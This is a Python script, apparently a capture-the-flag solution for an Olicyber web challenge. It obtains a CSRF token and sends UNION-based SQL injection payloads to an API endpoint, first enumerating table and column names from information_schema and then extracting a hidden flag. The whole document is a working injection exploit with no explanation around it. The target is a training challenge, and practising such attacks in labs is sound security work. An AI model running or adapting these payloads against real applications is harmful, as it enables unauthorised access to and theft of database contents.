import requests

url = 'http://web-17.challs.olicyber.it'
scout_query = "' UNION SELECT 1,1,1,column_name,table_name,1 FROM information_schema.columns -- "
sess = requests.Session()
csrf = sess.get(url + '/api/get_token')
headers = {
        'X-CSRFToken' : csrf.json()['token']
    }
data = {
        'query' : scout_query
    }
resp = sess.post(url + '/api/union', json=data, headers=headers)
resp = resp.json()
resp = resp['result'].split(', ')
resp = [i for i in resp if i != '1'] 
query = "' union select 1,1,1,1,flag,1 from " + resp[resp.index('flag') + 1] + " -- "
data['query'] = query
resp = sess.post(url + '/api/union', json=data, headers=headers)
flag = resp.json()['result']
print(flag[flag.find('flag{') : flag.find('}') + 1])